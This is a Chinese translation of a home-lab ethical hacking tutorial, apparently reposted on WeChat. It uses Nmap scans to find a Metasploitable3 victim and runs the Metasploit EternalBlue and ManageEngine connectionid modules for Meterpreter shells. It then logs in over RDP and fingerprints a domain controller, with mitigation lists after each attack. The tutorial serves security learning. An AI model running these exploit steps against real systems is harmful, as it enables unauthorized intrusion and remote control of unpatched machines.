---
title: 0134.构建虚拟道德黑客家庭实验室——第六部分：系统漏洞利用
url: https://mp.weixin.qq.com/s/isqOVIUQzWk5sOsActW7hw
source: Doonsec's feed
date: 2026-02-28
fetch_date: 2026-03-01T04:18:57.568860
---

# 0134.构建虚拟道德黑客家庭实验室——第六部分：系统漏洞利用

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/MW9pCm89BusXZxBsJgQEHIgCqdULn3Pgoaee8YsibnGuBn7ysBstayTcw6ug5icRAvVia1W58KGZd8cRY6I4S8vSEzPYhF4vEThibgyFgHkb9YI/0?wx_fmt=jpeg)

# 0134.构建虚拟道德黑客家庭实验室——第六部分：系统漏洞利用

原创

Omotola
Omotola

Rsec

![]()

在小说阅读器中沉浸阅读

本文章仅用网络安全研究学习，请勿使用相关技术进行违法犯罪活动。

声明：本文搬运自互联网，如你是原作者，请联系我们！

类型：模拟攻击

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/MW9pCm89ButvjaHiaAbmBVFqBIXslZd46o0gWLMth6UDvSS5ONVykNGibWofw2SF0JlYOlY8ZJfF9aTdWtyEV7vBab10Z0X5sl3VicGWNUB39Y/640?wx_fmt=jpeg&from=appmsg)

横幅背景图来自 Freepik 的 Logturnal | 黑客卡通图来自 Freepik 的 Designer29

在这一集中，我们将利用这些机器的漏洞。目标很简单：**识别出存在漏洞的服务，并像真正的攻击者一样利用它们。**

### 内容模块

1. 使用 Nmap 查找目标
2. 利用 MS17-010（永恒之蓝）漏洞
3. 利用第二个服务
4. 扫描域控制器 (DC1)

现在，让我们开始吧！

启动攻击机（Kali Linux）和受害机（Metaspoloitable3）

## **使用 Nmap 查找目标**

### **Ping/ARP 扫描——查找在线主机**

###

在kali**终端**上：

```
sudo nmap -sn 192.168.199.0/24
```

> *📝* 此命令**仅执行主机发现**（不涉及端口）。我们使用 192.168.199.0/24 网段，因为两台机器都位于该网段内。

![](https://mmbiz.qpic.cn/mmbiz_png/MW9pCm89Buv3xETDu16NlbF2e78T0XWFLSNiaeJwSGxRWQJvwjC32eBPiadIM9libTZVe3y5QwAUsv2NlAxbVkr7fn2nQicariaX31RVicCFsEE28/640?wx_fmt=png&from=appmsg)

我们可以看到192.168.199.196，这是受害者的 IP 地址。

###

### **扫描 Metasploitable3**

###

运行以下命令

```
sudo nmap 192.168.199.196
```

```
![](https://mmbiz.qpic.cn/mmbiz_png/MW9pCm89ButVerA6U8F1lp11sL1aoibI8Wp46I9tdMAoZwqn0lYjwmREAGuhwsR86riaic36zDQ1mNhVYGgctQqqIbOMzQgQRiccgGyuDPicLpWE/640?wx_fmt=png&from=appmsg)
```

这显示了受害者机器上开放的端口。

### **版本 + 操作系统检测扫描**

```
sudo nmap -sV -O 192.168.199.196
```

· `-sV` → 服务版本

· `-O` → 操作系统指纹识别

> *📝* 这次扫描可能需要一些时间……

![](https://mmbiz.qpic.cn/mmbiz_png/MW9pCm89BusmOrdiaPGH5Mqib7WnrxibF4aG25mZ6b41sWFZJJHoFa090HweoKtIMtGYBibDhH1jHaSHxZcQz994LtUYgGOKMgphCjF58ksUgnA/640?wx_fmt=png&from=appmsg)

你会看到一长串开放端口及其服务版本。

**请注意端口 445/tcp（这是我们的入口点）**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MW9pCm89BusoYII5DLZhwQeVuLgjQtTVhibbnkSX5pSV5iaGHODFtFAlRp8DPKeNoDCrzeTjdeRxZYIwFjn22ic50Rn78jGQicLsZfUfd9JvrZo/640?wx_fmt=png&from=appmsg)

利用 MS17-010（永恒之蓝）漏洞

这是**著名的 SMB 漏洞**（ WannaCry 就利用了这一点）。

###

### **让我们研究 MS17–010**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MW9pCm89ButwhYfBNvtBLZpSicCgYhsRv1Ma2hnH2JhOIcdjNvibZiaOKON3SZPS6VcAUR6Y8oDadXwUSFXiao8ticqydQsAEu00wWZ7CvNgOoTE/640?wx_fmt=png&from=appmsg)

### **Nmap SMB 漏洞脚本**

###

在 Kali 终端中，运行以下命令：

```
sudo nmap - script smb-vuln-ms17–010 192.168.199.196
```

![](https://mmbiz.qpic.cn/mmbiz_png/MW9pCm89BuvZDkaKny8HIs2SjkHp59PqglA3vf3JWQACcfndMGhB6xg1BucC31Jp4yM1HrYrKoNbiczcC5nzGwtSh9GyoP1VbbSBGCQhpTxA/640?wx_fmt=png&from=appmsg)

您可以看到 Microsoft SMBv1 中的远程代码执行漏洞。

这意味着该漏洞允许通过 SMBv1 在受害者机器上执行远程代码。

### **加载 Metasploit 模块**

###

`在msfconsole中执行：`

```
use exploit/windows/smb/ms17_010_eternalblue
```

![](https://mmbiz.qpic.cn/mmbiz_png/MW9pCm89BuuTxTwEz9z3picSSdBfeAgsVnXZSRwwcxcibsbmJrGibrMzHNG8NnNaJ722YibL8NBPUu612SEJ9yEKgXyXhowrF5PBKCU07jHmq54/640?wx_fmt=png&from=appmsg)

### 设置值：运行 `show options` 以了解要设置的参数

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MW9pCm89BuvWOD0VX9SzLpr4zcyae6icOg8mgHOicPhd6dkdFDmicVTVcgcvantficP4hjNnSSb2BgAG44RjfGIN9gicfAxYNuxn6nPNQ0NV5Fa0/640?wx_fmt=png&from=appmsg)

执行

```
Set RHOSTS 192.168.199.196
```

其他所有参数均已正确设置。

### **利用漏洞**

###

输入 `run` 并按 Enter 键

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MW9pCm89BusEm1XTUWVU3FC7FlEefSksWWqZu3cxwqZwIpqLFNrgC6bd9G13UDPDJzGtvdjicESkKCowHpKvmddtPMYrRhpsvpefXEsGQqyc/640?wx_fmt=png&from=appmsg)

如果成功，你会看到

*Meterpreter 会话 1 已打开，* 这意味着您已在目标计算机上建立了会话。

**在 meterpreter 内部，您可以运行：**

* sysinfo
* getuid
* shell

这证实我们已获得对受害系统的远程访问权限。

### **如何阻止这次攻击？**

🔒 安装 **MS17-010 补丁**

🔒 禁用 **SMBv1**

🔒 防火墙阻止端口 445

🔒 IDS/IPS 检测

🔒 网络分割

## **利用第二个服务**

> 真正的攻击者不会只依赖一条路径。

因此，我们将攻击**第二个服务**：运行在同一台机器上的存在漏洞的 **ManageEngine Desktop Central 9** 。

暂时不要退出 Metasploit 控制台。

* **目标：ManageEngine ServiceDesk / Desktop Central**
* **攻击类型：Web 应用程序→远程代码执行**

###

### 首先，让我们来寻找有效载荷。

```
search connectionid
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MW9pCm89ButCrnG75p7PAbTuvqiaByictPvnicpicZzCSNAdIuSQHKTb6KrFNdeqjwpabnJs1U5L0IgzBHpSWmbRrwyYQFQjBa97u2HxbicZS4vE/640?wx_fmt=png&from=appmsg)

### **更改有效载荷：**

```
use exploit/windows/http/manageengine_connectionid_write
```

然后;

```
show options
```

你会发现你只需要设置 RHOSTS（目标 IP 地址）即可。

### **运行漏洞利用程序**

```
run
```

**会发生什么：**

* 漏洞利用程序上传恶意 JSP 文件
* 触发它
* 你得到shell

![](https://mmbiz.qpic.cn/mmbiz_png/MW9pCm89Buv6tXopaMaK177p3dJWJECub2Pmkz7U5xjPaeEbqJFHpU0lqBoW1XIuUopDo36ooowFicia4kqxDzYs0XsoSSpicmuY4ksoshLWtU/640?wx_fmt=png&from=appmsg)

我们现在又打开了一个 Meterpreter 会话。

### **让我们证明访问权限**

> *📝* 为了证明我们对该机器的访问权限；请注意，当我们对目标进行服务扫描时，端口 3389 是打开的。

![](https://mmbiz.qpic.cn/mmbiz_png/MW9pCm89BusVr1d9blow9DgqS56tKO0TwqBum2RkDy6S80QMXfCs7e9OIeu8dSQcFc8c2jR52n9r86kIYgDxQdsnc5RNKH81QCarwejTZNc/640?wx_fmt=png&from=appmsg)

由于端口 3389 已打开，该系统也暴露了**远程桌面协议 (RDP)** ，这是攻击者的另一种潜在访问方式。

为此，我们将使用 `rdesktop` 命令建立 RDP 连接。

在 Kali 终端上打开另一个标签页

运行以下命令：

```
rdesktop 192.168.199.196:3389
```

![](https://mmbiz.qpic.cn/mmbiz_png/MW9pCm89BuvocRFKcEPmjSZoQbwQwZ1icl4W2QlrHVohcyD3ASt7GvicV9CI41oic3rnkNHAMff6Fsh1NmEEeWtBqv9EBYDVEe6FNqBHFUIfsU/640?wx_fmt=png&from=appmsg)

一个图形用户界面窗口弹出

登录受害者的电脑

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MW9pCm89BuvtbDZtByxfOFIQ56erudJiarpicAQ9zzGPE6AE1icHPOzmDMqb2t92jcRNGPsYAYDZI0ArerugVVEgHytFaUWGbh4p1RuBO5CKcU/640?wx_fmt=png&from=appmsg)

**登录成功！**

您现在拥有对系统的完全交互式访问权限。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MW9pCm89BuskvSTnMZ1ibVP11pCQCeWHohB8yF1RdELJC7xTEQCGRHxMBwDEq1xRWgX0RXSwZRMhBQEhB3Qn5eRmbqNlaJbJJZSxKuXcib5F4/640?wx_fmt=png&from=appmsg)

### **如何预防这种攻击**

🔒 修补管理引擎

🔒 限制网络访问（防火墙）

🔒 使用 Web 应用程序防火墙 (WAF)

🔒 禁用不必要的网页上传功能

🔒 监控日志，查找可疑的 JSP 上传

🔒 通过防火墙规则或仅限 VPN 访问来限制 RDP 访问。

扫描域控制器 (DC1)

### **执行版本扫描**

```
sudo nmap -sV 192.168.199.128
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MW9pCm89ButTicE2IDYWEhnPaRicwGJUZYWN38guAsZmUIA4cyQg2cHBiaK41PbeuzgjMibJVLXcs9v5mrrMx2V9csmkmQ7weic5dYIvbcqYoY3c/640?wx_fmt=png&from=appmsg)

### **然后执行 SMB 脚本扫描**

```
sudo nmap - script smb-os-discovery -p445 192.168.199.128
```

![](https://mmbiz.qpic.cn/mmbiz_png/MW9pCm89BuvXhYibmJaasd3CTKxHK68sAdlzUYZq6rchQUjRjr1ZcMtkRV22iafibiaULicxZEkSVX2ibicoj89OJKIib8EOSmOG9WIqYxSKclKWE2Y/640?wx_fmt=png&from=appmsg)

你会看到类似这样的内容：

**Windows Server 2016 标准版**

你知道的原因是：

* SMB 脚本揭示操作系统
* Kerberos 端口已打开 (88)
* LDAP 端口已开放（389）
* 域名服务呈现

在这一集中，我们从侦察越过了界限，真正入侵了系统。

通过结合服务枚举、漏洞验证和利用技术，我们展示了如何通过多种攻击路径入侵未打补丁的系统。

### 我们成功地：

🔓 已识别网络上的在线主播

🔓 发现存在漏洞的服务

🔓 使用漏洞脚本确认漏洞

🔓 利用 EternalBlue 漏洞攻击 SMB

🔓 使用不同类型的有效载荷获得了远程访问权限

🔓 通过服务枚举分析域控制器

本次实验最重要的启示是，**攻击者不会依赖单一入口点**。如果一项服务失效，另一项服务可能就会成功。

安全漏洞的出现往往不是因为高超的黑客技术，而是因为**缺少补丁和暴露的服务。**

该实验揭示了网络安全领域的一个关键事实：

> **一个系统的强度取决于其最薄弱的、暴露在外的服务的强度。**

预览时标签不可点

阅读原文

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/yKTOKd3ibs98K2tqBAticMskicyUAjtQoicZSdgKiaj1G5KGKOyd7A6paRrrHhz2JVvU3RLRsboI6MibP7Nl68yVAyTw/0?wx_fmt=png)

Rsec

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/yKTOKd3ibs98K2tqBAticMskicyUAjtQoicZSdgKiaj1G5KGKOyd7A6paRrrHhz2JVvU3RLRsboI6MibP7Nl68yVAyTw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过